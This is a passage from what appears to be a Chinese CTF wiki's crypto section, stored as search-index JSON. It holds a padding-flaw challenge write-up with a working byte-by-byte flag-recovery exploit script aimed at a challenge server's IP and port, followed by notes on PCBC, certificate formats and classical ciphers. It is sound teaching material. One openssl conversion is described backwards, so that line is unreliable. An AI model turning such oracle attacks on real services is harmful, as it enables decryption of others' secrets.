server.serve_forever()\n</code></pre>"},{"location":"crypto/blockcipher/mode/padding/#_2","title":"\u5206\u6790","text":"<p>\u8fd9\u4e2a\u9898\u76ee\u95ee\u9898\u51fa\u5728 padding \u7684\u65f6\u5019\uff0c\u7531\u4e8e\u4e0d\u8db3 256 \u4f4d\u8981\u8fdb\u884c padding\uff0cpadding \u7684\u5b57\u8282\u4e5f\u5c31\u662f\u7f3a\u7684\u5b57\u8282\u6570\uff0c\u4f46\u662f\u5982\u679c\u660e\u6587\u591f 256 \u5b57\u8282\uff0c\u90a3\u4e48\u6309\u7167\u4ee3\u7801\u903b\u8f91\u5c31\u4e0d\u8fdb\u884c padding\uff1a </p> <pre><code>def pad(self, s):\n        s += (256 - len(s)) * chr(256 - len(s))\n        ret = ['\\x00' for _ in range(256)]\n        for index, pos in enumerate(self.s_box):\n            ret[pos] = s[index]\n        return ''.join(ret)\n</code></pre> <p>\u6700\u5927\u7684\u95ee\u9898\u51fa\u5728 unpad \u4e0a\uff0cunpad \u6ca1\u6709\u8fdb\u884c\u68c0\u67e5\uff0c\u4ec5\u4ec5\u901a\u8fc7\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u6765\u5224\u65ad\u586b\u5145\u7684\u5b57\u8282\u6570\u3002 </p> <pre><code> def unpad(self, s):\n        ret = ['\\x00' for _ in range(256)]\n        for index, pos in enumerate(self.invs_box):\n            ret[pos] = s[index]\n        return ''.join(ret[0:-ord(ret[-1])])\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7be1\u6539\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u6765\u63a7\u5236\u53bb\u6389\u7684 padding \u5b57\u8282\u6570\u3002</p>"},{"location":"crypto/blockcipher/mode/padding/#_3","title":"\u5229\u7528","text":"<ol> <li> <p>\u9009\u62e9 choice2\uff0c\u8ffd\u52a0 <code>256-33 =223</code>\u5b57\u8282\uff0c\u4f7f\u5f53\u524d flag \u4e0d\u9700\u8981\u586b\u5145\uff0c\u8ffd\u52a0\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u8bbe\u7f6e\u6210 <code>chr(256-32)</code>\u3002</p> </li> <li> <p>\u670d\u52a1\u5668\u5bf9 flag \u8ffd\u52a0\u6211\u4eec\u7684\u4fe1\u606f\uff0c\u5e76\u8fdb\u884c s \u76d2\u66ff\u6362\uff0c\u7ed3\u679c\u8d4b\u7ed9\u7c7b\u4e2d\u7684 flag \u53d8\u91cf\u3002</p> </li> <li> <p>\u6211\u4eec\u518d\u6b21\u9009\u62e9 choice2\uff0c\u8fd9\u91cc\u7531\u4e8e\u6211\u4eec\u9700\u8981\u8ffd\u52a0\uff0c\u670d\u52a1\u5668\u4f1a\u5c06\u7c7b\u4e2d\u7684 flag \u53d8\u91cf\u53d6\u51fa\u8fdb\u884c\u9006 S \u76d2\u66ff\u6362\u548c unpad\uff0c\u8fd9\u6837\u6309\u7167\u8fd9\u4e2a unpad \u7b97\u6cd5\u4f1a\u628a\u540e\u9762 224 \u5b57\u8282\u7684\u5168\u90e8\u5f53\u6210 padding\u53bb\u6389\uff0c\u660e\u6587\u5269\u4e0b\u4e86\u771f\u6b63 flag \u7684\u524d32\u4f4d\u3002</p> </li> <li> <p>\u6211\u4eec\u6b64\u65f6\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26 i,\u90a3\u4e48\u6b64\u65f6\u52a0\u5bc6\u7684\u5bf9\u8c61\u5c31\u662f <code>flag[:32]+i</code>\u3002</p> </li> <li> <p>\u9009\u62e9 choice1 \u5bf9\u5f53\u524d flag \u52a0\u5bc6\uff0c\u63a7\u5236 i \u8fdb\u884c\u7206\u7834\uff0c\u5982\u679c\u5f97\u5230\u7684\u5bc6\u6587\u548c\u6700\u521d\u7684 flag \u52a0\u5bc6\u7684\u5bc6\u6587\u4e00\u6837\uff0c\u5c31\u5f97\u5230\u4e86 flag \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002</p> </li> <li> <p>\u9010\u5b57\u8282\u7206\u7834\uff0c\u76f4\u81f3\u83b7\u53d6\u5168\u90e8\u7684 flag\u3002 </p> </li> </ol> <p>exp \u5982\u4e0b\uff1a</p> <pre><code># -*- coding: utf-8 -*-\nfrom hashlib import sha256\nimport socket\nimport string\nimport itertools\nHOST='106.75.13.64'\nPORT=54321\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect((HOST, PORT))\ndef brute_force(pad, shavalue):\n    for str in itertools.product(string.ascii_letters + string.digits, repeat=4):\n        str=''.join(str)\n        if sha256(str + pad).hexdigest() == shavalue:\n            print str\n            return str\ndef choice1():\n    sock.send(\"1\\n\")\n    result=sock.recv(1024).strip()[30:]\n    sock.recv(1024).strip()\n    return result\ndef choice2(pad):\n    sock.send(\"2\\n\")\n    sock.recv(1024).strip()\n    sock.send(pad+\"\\n\")\n    sock.recv(1024).strip()\n    sock.recv(1024).strip()\ndef choice3(str):\n    sock.send(\"3\\n\")\n    sock.recv(1024).strip()\n    sock.send(str+\"\\n\")\n    result=sock.recv(1024).strip()[33:]\n    sock.recv(1024).strip()\n    return result\ncontent = sock.recv(1024).strip()\npad=content[12:12+16]\nhash=content[33:33+64]\nsock.recv(1024).strip()\nsock.send(str(brute_force(pad,hash))+\"\\n\")\nprint sock.recv(1024).strip()\nflag_enc=choice1()\nflag=\"\"\nfor i in range(33):\n    a = ''.join(['a' for _ in range(223)])\n    a = a[:-1] + chr(224+i)\n    for c in string.printable:\n        print c+flag\n        choice2(a)\n        choice2(c+flag)\n        if choice1() == flag_enc:\n            flag=c+flag\n            print \"success:\",flag\n            break\n</code></pre> <p>flag{H4ve_fun_w1th_p4d_and_unp4d} </p>"},{"location":"crypto/blockcipher/mode/pcbc/","title":"PCBC","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>PCBC \u7684\u5168\u79f0\u4e3a\u660e\u6587\u5bc6\u7801\u5757\u94fe\u63a5\uff08Plaintext cipher-block chaining\uff09\u3002\u4e5f\u79f0\u4e3a\u586b\u5145\u5bc6\u7801\u5757\u94fe\u63a5\uff08Propagating cipher-block chaining\uff09\u3002</p>"},{"location":"crypto/blockcipher/mode/pcbc/#_1","title":"\u52a0\u5bc6","text":""},{"location":"crypto/blockcipher/mode/pcbc/#_2","title":"\u89e3\u5bc6","text":""},{"location":"crypto/blockcipher/mode/pcbc/#_3","title":"\u7279\u70b9","text":"<ul> <li>\u89e3\u5bc6\u8fc7\u7a0b\u96be\u4ee5\u5e76\u884c\u5316</li> <li>\u4e92\u6362\u90bb\u63a5\u7684\u5bc6\u6587\u5757\u4e0d\u4f1a\u5bf9\u540e\u9762\u7684\u5bc6\u6587\u5757\u9020\u6210\u5f71\u54cd</li> </ul>"},{"location":"crypto/certificate/introduction/","title":"\u8bc1\u4e66\u683c\u5f0f","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/certificate/introduction/#pem","title":"PEM","text":"<p>PEM \u4ee5 <code>-----BEGIN</code> \u5f00\u5934\uff0c\u4ee5 <code>-----END</code> \u7ed3\u5c3e\uff0c\u4e2d\u95f4\u5305\u542b ASN.1 \u683c\u5f0f\u7684\u6570\u636e\u3002ASN.1 \u662f\u7ecf\u8fc7 base64 \u8f6c\u7801\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u3002Wikipedia \u4e0a\u6709\u5b8c\u6574 PEM \u6587\u4ef6\u7684\u4f8b\u5b50\u3002</p> <p>\u7528 Python 3 \u548c PyCryptodome \u5e93\u53ef\u4ee5\u4e0e PEM \u6587\u4ef6\u4ea4\u4e92\u5e76\u63d0\u53d6\u76f8\u5173\u6570\u636e\u3002\u4f8b\u5982\u6211\u4eec\u60f3\u63d0\u53d6\u51fa\u6a21\u6570 <code>n</code>\uff1a</p> <pre><code>#!/usr/bin/env python3\nfrom Crypto.PublicKey import RSA\n\nwith open(\"certificate.pem\",\"r\") as f:\n    key = RSA.import_key(f.read())\n    print(key.n)\n</code></pre>"},{"location":"crypto/certificate/introduction/#der","title":"DER","text":"<p>DER \u662f ASN.1 \u7c7b\u578b\u7684\u4e8c\u8fdb\u5236\u7f16\u7801\u3002\u540e\u7f00 <code>.cer</code> \u6216 <code>.crt</code> \u7684\u8bc1\u4e66\u901a\u5e38\u5305\u542b DER \u683c\u5f0f\u7684\u6570\u636e\uff0c\u4f46 Windows \u4e5f\u53ef\u80fd\u4f1a\u63a5\u53d7 PEM \u683c\u5f0f\u7684\u6570\u636e\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u7528 <code>openssl</code> \u5c06 PEM \u6587\u4ef6\u8f6c\u5316\u4e3a DER \u6587\u4ef6\uff1a</p> <pre><code>openssl x509 -inform DER -in certificate.der &gt; certificate.pem\n</code></pre> <p>\u73b0\u5728\u95ee\u9898\u88ab\u7b80\u5316\u6210\u4e86\u5982\u4f55\u8bfb\u53d6 PEM \u6587\u4ef6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u91cd\u590d\u4f7f\u7528\u4e0a\u4e00\u5c0f\u8282\u4e2d\u7684 Python \u4ee3\u7801\u3002</p>"},{"location":"crypto/certificate/introduction/#_2","title":"\u5176\u4ed6\u683c\u5f0f\u8f6c\u6362","text":"<pre><code>openssl x509 -outform der -in certificate.pem -out certificate.der\nopenssl x509 -inform der -in certificate.cer -out certificate.pem\n</code></pre>"},{"location":"crypto/certificate/introduction/#_3","title":"\u5f15\u7528","text":"<ol> <li>Attacking RSA for fun and CTF points \u2013 part 1</li> <li>What are the differences between .pem, .cer and .der?</li> </ol>"},{"location":"crypto/classical/introduction/","title":"\u53e4\u5178\u5bc6\u7801\u7b80\u4ecb","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5728\u53e4\u5178\u5bc6\u7801\u5b66\u4e2d\uff0c\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd\u5355\u8868\u66ff\u4ee3\u5bc6\u7801\uff0c\u591a\u8868\u66ff\u4ee3\u5bc6\u7801\uff0c\u4ee5\u53ca\u4e00\u4e9b\u5176\u5b83\u6bd4\u8f83\u6709\u610f\u601d\u7684\u5bc6\u7801\u3002</p> <p>\u503c\u5f97\u4e00\u63d0\u7684\u662f\uff0c\u5728\u53e4\u5178\u5bc6\u7801\u5b66\u4e2d\uff0c\u8bbe\u8ba1\u8005\u4e3b\u8981\u8003\u8651\u6d88\u606f\u7684\u4fdd\u5bc6\u6027\uff0c\u4f7f\u5f97\u53ea\u6709\u76f8\u5173\u5bc6\u94a5\u7684\u4eba\u624d\u53ef\u4ee5\u89e3\u5bc6\u5bc6\u6587\u83b7\u5f97\u6d88\u606f\u7684\u5185\u5bb9\uff0c\u5bf9\u4e8e\u6d88\u606f\u7684\u5b8c\u6574\u6027\u548c\u4e0d\u53ef\u5426\u8ba4\u6027\u5219\u5e76\u6ca1\u6709\u8fdb\u884c\u592a\u591a\u7684\u8003\u8651\u3002</p> <ul> <li> <p>\u62d3\u5c55\u9605\u8bfb</p> <ul> <li>CTF \u4e2d\u90a3\u4e9b\u8111\u6d1e\u5927\u5f00\u7684\u7f16\u7801\u548c\u52a0\u5bc6</li> <li>\u53e4\u5178\u5bc6\u7801\u5b66\u53d1\u5c55\u53f2</li> <li>\u53e4\u5178\u5bc6\u7801\u2014\u2014\u7ef4\u57fa\u767e\u79d1</li> </ul> </li> </ul>"},{"location":"crypto/classical/monoalphabetic/","title":"\u5355\u8868\u4ee3\u6362\u52a0\u5bc6","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/classical/monoalphabetic/#_2","title":"\u901a\u7528\u7279\u70b9","text":"<p>\u5728\u5355\u8868\u66ff\u6362\u52a0\u5bc6\u4e2d\uff0c\u6240\u6709\u7684\u52a0\u5bc6\u65b9\u5f0f\u51e0\u4e4e\u90fd\u6709\u4e00\u4e2a\u5171\u6027\uff0c\u90a3\u5c31\u662f\u660e\u5bc6\u6587\u4e00\u4e00\u5bf9\u5e94\u3002\u6240\u4ee5\u8bf4\uff0c\u4e00\u822c\u6709\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\u6765\u8fdb\u884c\u7834\u89e3</p> <ul> <li>\u5728\u5bc6\u94a5\u7a7a\u95f4\u8f83\u5c0f\u7684\u60c5\u51b5\u4e0b\uff0c\u91c7\u7528\u66b4\u529b\u7834\u89e3\u65b9\u5f0f</li> <li>\u5728\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u957f\u7684\u65f6\u5019\uff0c\u4f7f\u7528\u8bcd\u9891\u5206\u6790\uff0chttp://quipqiup.com/</li> </ul> <p>\u5f53\u5bc6\u94a5\u7a7a\u95f4\u8db3\u591f\u5927\uff0c\u800c\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u77ed\u7684\u60c5\u51b5\u4e0b\uff0c\u7834\u89e3\u8f83\u4e3a\u56f0\u96be\u3002</p>"},{"location":"crypto/classical/monoalphabetic/#_3","title":"\u51ef\u6492\u5bc6\u7801","text":""},{"location":"crypto/classical/monoalphabetic/#_4","title":"\u539f\u7406","text":"<p>\u51ef\u6492\u5bc6\u7801\uff08Caesar\uff09\u52a0\u5bc6\u65f6\u4f1a\u5c06\u660e\u6587\u4e2d\u7684 \u6bcf\u4e2a\u5b57\u6bcd \u90fd\u6309\u7167\u5176\u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u987a\u5e8f\u5411\u540e\uff08\u6216\u5411\u524d\uff09\u79fb\u52a8\u56fa\u5b9a\u6570\u76ee\uff08\u5faa\u73af\u79fb\u52a8\uff09\u4f5c\u4e3a\u5bc6\u6587\u3002\u4f8b\u5982\uff0c\u5f53\u504f\u79fb\u91cf\u662f\u5de6\u79fb 3 \u7684\u65f6\u5019\uff08\u89e3\u5bc6\u65f6\u7684\u5bc6\u94a5\u5c31\u662f 3\uff09\uff1a</p> <pre><code>\u660e\u6587\u5b57\u6bcd\u8868\uff1aABCDEFGHIJKLMNOPQRSTUVWXYZ\n\u5bc6\u6587\u5b57\u6bcd\u8868\uff1aDEFGHIJKLMNOPQRSTUVWXYZABC\n</code></pre> <p>\u4f7f\u7528\u65f6\uff0c\u52a0\u5bc6\u8005\u67e5\u627e\u660e\u6587\u5b57\u6bcd\u8868\u4e2d\u9700\u8981\u52a0\u5bc6\u7684\u6d88\u606f\u4e2d\u7684\u6bcf\u4e00\u4e2a\u5b57\u6bcd\u6240\u5728\u4f4d\u7f6e\uff0c\u5e76\u4e14\u5199\u4e0b\u5bc6\u6587\u5b57\u6bcd\u8868\u4e2d\u5bf9\u5e94\u7684\u5b57\u6bcd\u3002\u9700\u8981\u89e3\u5bc6\u7684\u4eba\u5219\u6839\u636e\u4e8b\u5148\u5df2\u77e5\u7684\u5bc6\u94a5\u53cd\u8fc7\u6765\u64cd\u4f5c\uff0c\u5f97\u5230\u539f\u6765\u7684\u660e\u6587\u3002\u4f8b\u5982\uff1a</p> <pre><code>\u660e\u6587\uff1aTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\n\u5bc6\u6587\uff1aWKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ\n</code></pre> <p>\u6839\u636e\u504f\u79fb\u91cf\u7684\u4e0d\u540c\uff0c\u8fd8\u5b58\u5728\u82e5\u5e72\u7279\u5b9a\u7684\u607a\u6492\u5bc6\u7801\u540d\u79f0\uff1a</p> <ul> <li>\u504f\u79fb\u91cf\u4e3a 10\uff1aAvocat \uff08A\u2192K\uff09</li> <li>\u504f\u79fb\u91cf\u4e3a 13\uff1aROT13</li> <li>\u504f\u79fb\u91cf\u4e3a -5\uff1aCassis \uff08K 6\uff09</li> <li>\u504f\u79fb\u91cf\u4e3a -6\uff1aCassette \uff08K 7\uff09</li> </ul> <p>\u6b64\u5916\uff0c\u8fd8\u6709\u8fd8\u6709\u4e00\u79cd\u57fa\u4e8e\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801 Keyed Caesar\u3002\u5176\u57fa\u672c\u539f\u7406\u662f \u5229\u7528\u4e00\u4e2a\u5bc6\u94a5\uff0c\u5c06\u5bc6\u94a5\u7684\u6bcf\u4e00\u4f4d\u8f6c\u6362\u4e3a\u6570\u5b57\uff08\u4e00\u822c\u8f6c\u5316\u4e3a\u5b57\u6bcd\u8868\u5bf9\u5e94\u987a\u5e8f\u7684\u6570\u5b57\uff09\uff0c\u5206\u522b\u4ee5\u8fd9\u4e00\u6570\u5b57\u4e3a\u5bc6\u94a5\u52a0\u5bc6\u660e\u6587\u7684\u6bcf\u4e00\u4f4d\u5b57\u6bcd\u3002</p> <p>\u8fd9\u91cc\u4ee5 XMan \u4e00\u671f\u590f\u4ee4\u8425\u5206\u4eab\u8d5b\u5bab\u4fdd\u9e21\u4e01\u961f Crypto 100 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002</p> <pre><code>\u5bc6\u6587\uff1as0a6u3u1s0bv1a\n\u5bc6\u94a5\uff1aguangtou\n\u504f\u79fb\uff1a6,20,0,13,6,19,14,20\n\u660e\u6587\uff1ay0u6u3h1y0uj1u\n</code></pre>"},{"location":"crypto/classical/monoalphabetic/#_5","title":"\u7834\u89e3","text":"<p>\u5bf9\u4e8e\u4e0d\u5e26\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801\u6765\u8bf4\uff0c\u5176\u57fa\u672c\u7684\u7834\u89e3\u65b9\u6cd5\u6709\u4e24\u79cd\u65b9\u5f0f</p> <ol> <li>\u904d\u5386 26 \u4e2a\u504f\u79fb\u91cf\uff0c\u9002\u7528\u4e8e\u666e\u904d\u60c5\u51b5</li> <li>\u5229\u7528\u8bcd\u9891\u5206\u6790\uff0c\u9002\u7528\u4e8e\u5bc6\u6587\u8f83\u957f\u7684\u60c5\u51b5\u3002</li> </ol> <p>\u5176\u4e2d\uff0c\u7b2c\u4e00\u79cd\u65b9\u5f0f\u80af\u5b9a\u53ef\u4ee5\u5f97\u5230\u660e\u6587\uff0c\u800c\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u5219\u4e0d\u4e00\u5b9a\u53ef\u4ee5\u5f97\u5230\u6b63\u786e\u7684\u660e\u6587\u3002</p> <p>\u800c\u5bf9\u4e8e\u57fa\u4e8e\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801\u6765\u8bf4\uff0c\u4e00\u822c\u6765\u8bf4\u5fc5\u987b\u77e5\u9053\u5bf9\u5e94\u7684\u5bc6\u94a5\u3002</p>"},{"location":"crypto/classical/monoalphabetic/#_6","title":"\u5de5\u5177","text":"<p>\u4e00\u822c\u6211\u4eec\u6709\u5982\u4e0b\u7684\u5de5\u5177\uff0c\u5176\u4e2dJPK\u6bd4\u8f83\u901a\u7528\u3002</p> <ul> <li>JPK\uff0c\u53ef\u89e3\u5e26\u5bc6\u94a5\u4e0e\u4e0d\u5e26\u5bc6\u94a5</li> <li>http://planetcalc.com/1434/</li> <li>http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php</li> </ul>"},{"location":"crypto/classical/monoalphabetic/#_7","title":"\u79fb\u4f4d\u5bc6\u7801","text":"<p>\u4e0e\u51ef\u6492\u5bc6\u7801\u7c7b\u4f3c\uff0c\u533a\u522b\u5728\u4e8e\u79fb\u4f4d\u5bc6\u7801\u4e0d\u4ec5\u4f1a\u5904\u7406\u5b57\u6bcd\uff0c\u8fd8\u4f1a\u5904\u7406\u6570\u5b57\u548c\u7279\u6b8a\u5b57\u7b26\uff0c\u5e38\u7528 ASCII \u7801\u8868\u8fdb\u884c\u79fb\u4f4d\u3002\u5176\u7834\u89e3\u65b9\u6cd5\u4e5f\u662f\u904d\u5386\u6240\u6709\u7684\u53ef\u80fd\u6027\u6765\u5f97\u5230\u53ef\u80fd\u7684\u7ed3\u679c\u3002</p>"},{"location":"crypto/classical/monoalphabetic/#atbash-cipher","title":"Atbash Cipher","text":""},{"location":"crypto/classical/monoalphabetic/#_8","title":"\u539f\u7406","text":"<p>\u57c3\u7279\u5df4\u4ec0\u7801\uff08Atbash Cipher\uff09\u5176\u5b9e\u53ef\u4ee5\u89c6\u4e3a\u4e0b\u9762\u8981\u4ecb\u7ecd\u7684\u7b80\u5355\u66ff\u6362\u5bc6\u7801\u7684\u7279\u4f8b\uff0c\u5b83\u4f7f\u7528\u5b57\u6bcd\u8868\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\u4ee3\u8868\u7b2c\u4e00\u4e2a\u5b57\u6bcd\uff0c\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\u4ee3\u8868\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\u3002\u5728\u7f57\u9a6c\u5b57\u6bcd\u8868\u4e2d\uff0c\u5b83\u662f\u8fd9\u6837\u51fa\u73b0\u7684\uff1a</p> <pre><code>\u660e\u6587\uff1aA B C D E F G H I J K L M N O P Q R S T U V W X Y Z\n\u5bc6\u6587\uff1aZ Y X W V U T S R Q P O N M L K J I H G F E D C B A\n</code></pre> <p>\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\uff1a</p> <pre><code>\u660e\u6587\uff1athe quick brown fox jumps over the lazy dog\n\u5bc6\u6587\uff1agsv jfrxp yildm ulc qfnkh levi gsv ozab wlt\n</code></pre>"},{"location":"crypto/classical/monoalphabetic/#_9","title":"\u7834\u89e3","text":"<p>\u53ef\u4ee5\u770b\u51fa\u5176\u5bc6\u94a5\u7a7a\u95f4\u8db3\u591f\u77ed\uff0c\u540c\u65f6\u5f53\u5bc6\u6587\u8db3\u591f\u957f\u65f6\uff0c\u4ecd\u7136\u53ef\u4ee5\u91c7\u7528\u8bcd\u9891\u5206\u6790\u7684\u65b9\u6cd5\u89e3\u51b3\u3002</p>"},{"location":"crypto/classical/monoalphabetic/#_10","title":"\u5de5\u5177","text":"<ul> <li>http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/</li> </ul>"},{"location":"crypto/classical/monoalphabetic/#_11","title":"\u7b80\u5355\u66ff\u6362\u5bc6\u7801","text":""},{"location":"crypto/classical/monoalphabetic/#_12","title":"\u539f\u7406","text":"<p>\u7b80\u5355\u66ff\u6362\u5bc6\u7801\uff08Simple Substitution Cipher\uff09\u52a0\u5bc6\u65f6\uff0c\u5c06\u6bcf\u4e2a\u660e\u6587\u5b57\u6bcd\u66ff\u6362\u4e3a\u4e0e\u4e4b\u552f\u4e00\u5bf9\u5e94\u4e14\u4e0d\u540c\u7684\u5b57\u6bcd\u3002\u5b83\u4e0e\u607a\u6492\u5bc6\u7801\u4e4b\u95f4\u7684\u533a\u522b\u662f\u5176\u5bc6\u7801\u5b57\u6bcd\u8868\u7684\u5b57\u6bcd\u4e0d\u662f\u7b80\u5355\u7684\u79fb\u4f4d\uff0c\u800c\u662f\u5b8c\u5168\u662f\u6df7\u4e71\u7684\uff0c\u8fd9\u4e5f\u4f7f\u5f97\u5176\u7834\u89e3\u96be\u5ea6\u8981\u9ad8\u4e8e\u51ef\u6492\u5bc6\u7801\u3002 \u6bd4\u5982\uff1a</p> <pre><code>\u660e\u6587\u5b57\u6bcd : abcdefghijklmnopqrstuvwxyz\n\u5bc6\u94a5\u5b57\u6bcd : phqgiumeaylnofdxjkrcvstzwb\n</code></pre> <p>a \u5bf9\u5e94 p\uff0cd \u5bf9\u5e94 h\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002</p> <pre><code>\u660e\u6587\uff1athe quick brown fox jumps over the lazy dog\n\u5bc6\u6587\uff1acei jvaql hkdtf udz yvoxr dsik cei npbw gdm\n</code></pre> <p>\u800c\u89e3\u5bc6\u65f6\uff0c\u6211\u4eec\u4e00\u822c\u662f\u77e5\u9053\u4e86\u6bcf\u4e00\u4e2a\u5b57\u6bcd\u7684\u5bf9\u5e94\u89c4\u5219\uff0c\u624d\u53ef\u4ee5\u6b63\u5e38\u89e3\u5bc6\u3002</p>"},{"location":"crypto/classical/monoalphabetic/#_13","title":"\u7834\u89e3","text":"<p>\u7531\u4e8e\u8fd9\u79cd\u52a0\u5bc6\u65b9\u5f0f\u5bfc\u81f4\u5176\u6240\u6709\u7684\u5bc6\u94a5\u4e2a\u6570\u662f26! \uff0c\u6240\u4ee5\u51e0\u4e4e\u4e0a\u4e0d\u53ef\u80fd\u4f7f\u7528\u66b4\u529b\u7684\u89e3\u51b3\u65b9\u5f0f\u3002\u6240\u4ee5\u6211\u4eec \u4e00\u822c\u91c7\u7528\u8bcd\u9891\u5206\u6790\u3002</p>"},{"location":"crypto/classical/monoalphabetic/#_14","title":"\u5de5\u5177","text":"<ul> <li>http://quipqiup.com/</li> </ul>"},{"location":"crypto/classical/monoalphabetic/#_15","title":"\u4eff\u5c04\u5bc6\u7801","text":""},{"location":"crypto/classical/monoalphabetic/#_16","title":"\u539f\u7406","text":"<p>\u4eff\u5c04\u5bc6\u7801\u7684\u52a0\u5bc6\u51fd\u6570\u662f E(x)=(ax+b)\\pmod m\uff0c\u5176\u4e2d</p> <ul> <li>x \u8868\u793a\u660e\u6587\u6309\u7167\u67d0\u79cd\u7f16\u7801\u5f97\u5230\u7684\u6570\u5b57</li> <li>a \u548c m \u4e92\u8d28</li> <li>m \u662f\u7f16\u7801\u7cfb\u7edf\u4e2d\u5b57\u6bcd\u7684\u6570\u76ee\u3002</li> </ul> <p>\u89e3\u5bc6\u51fd\u6570\u662f D(x)=a^{-1}(x-b)\\pmod m\uff0c\u5176\u4e2d a^{-1} \u662f a \u5728 \\mathbb{Z}_{m} \u7fa4\u7684\u4e58\u6cd5\u9006\u5143\u3002</p> <p>\u4e0b\u9762\u6211\u4eec\u4ee5 E(x) = (5x + 8) \\bmod 26 \u51fd\u6570\u4e3a\u4f8b\u5b50\u8fdb\u884c\u4ecb\u7ecd\uff0c\u52a0\u5bc6\u5b57\u7b26\u4e32\u4e3a <code>AFFINE CIPHER</code>\uff0c\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u91c7\u7528\u5b57\u6bcd\u886826\u4e2a\u5b57\u6bcd\u4f5c\u4e3a\u7f16\u7801\u7cfb\u7edf</p> \u660e\u6587 A F F I N E C I P H E R x 0 5 5 8 13 4 2 8 15 7 4 17 y=5x+8 8 33 33 48 73 28 18 48 83 43 28 93 y\\mod26 8 7 7 22 21 2 18 22 5 17 2 15 \u5bc6\u6587 I H H W V C S W F R C P <p>\u5176\u5bf9\u5e94\u7684\u52a0\u5bc6\u7ed3\u679c\u662f <code>IHHWVCSWFRCP</code>\u3002</p> <p>\u5bf9\u4e8e\u89e3\u5bc6\u8fc7\u7a0b\uff0c\u6b63\u5e38\u89e3\u5bc6\u8005\u5177\u6709a\u4e0eb\uff0c\u53ef\u4ee5\u8ba1\u7b97\u5f97\u5230 a^{-1} \u4e3a 21\uff0c\u6240\u4ee5\u5176\u89e3\u5bc6\u51fd\u6570\u662fD(x)=21(x-8)\\pmod {26} \uff0c\u89e3\u5bc6\u5982\u4e0b</p> \u5bc6\u6587 I H H W V C S W F R C P y 8 7 7 22 21 2 18 22 5 17 2 15 x=21(y-8) 0 -21 -21 294 273 -126 210 294 -63 189 -126 147 x\\mod26 0 5 5 8 13 4 2 8 15 7 4 17 \u660e\u6587 A F F I N E C I P H E R <p>\u53ef\u4ee5\u770b\u51fa\u5176\u7279\u70b9\u5728\u4e8e\u53ea\u6709 26 \u4e2a\u82f1\u6587\u5b57\u6bcd\u3002</p>"},{"location":"crypto/classical/monoalphabetic/#_17","title":"\u7834\u89e3","text":"<p>\u9996\u5148\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7684\u662f\uff0c\u4eff\u5c04\u5bc6\u7801\u5bf9\u4e8e\u4efb\u610f\u4e24\u4e2a\u4e0d\u540c\u7684\u5b57\u6bcd\uff0c\u5176\u6700\u540e\u5f97\u5230\u7684\u5bc6\u6587\u5fc5\u7136\u4e0d\u4e00\u6837\uff0c\u6240\u4ee5\u5176\u4e5f\u5177\u6709\u6700\u901a\u7528\u7684\u7279\u70b9\u3002\u5f53\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u957f\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u9891\u7387\u5206\u6790\u7684\u65b9\u6cd5\u6765\u89e3\u51b3\u3002</p> <p>\u5176\u6b21\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u5982\u4f55\u653b\u51fb\u8be5\u5bc6\u7801\u3002\u53ef\u4ee5\u770b\u51fa\u5f53a=1 \u65f6\uff0c\u4eff\u5c04\u52a0\u5bc6\u662f\u51ef\u6492\u52a0\u5bc6\u3002\u800c\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5229\u7528\u4eff\u5c04\u5bc6\u7801\u65f6\uff0c\u5176\u5b57\u7b26\u96c6\u90fd\u7528\u7684\u662f\u5b57\u6bcd\u8868\uff0c\u4e00\u822c\u53ea\u670926\u4e2a\u5b57\u6bcd\uff0c\u800c\u4e0d\u5927\u4e8e26\u7684\u4e0e26\u4e92\u7d20\u7684\u4e2a\u6570\u4e00\u5171\u6709 </p>  \\phi(26)=\\phi(2) \\times \\phi(13) = 12  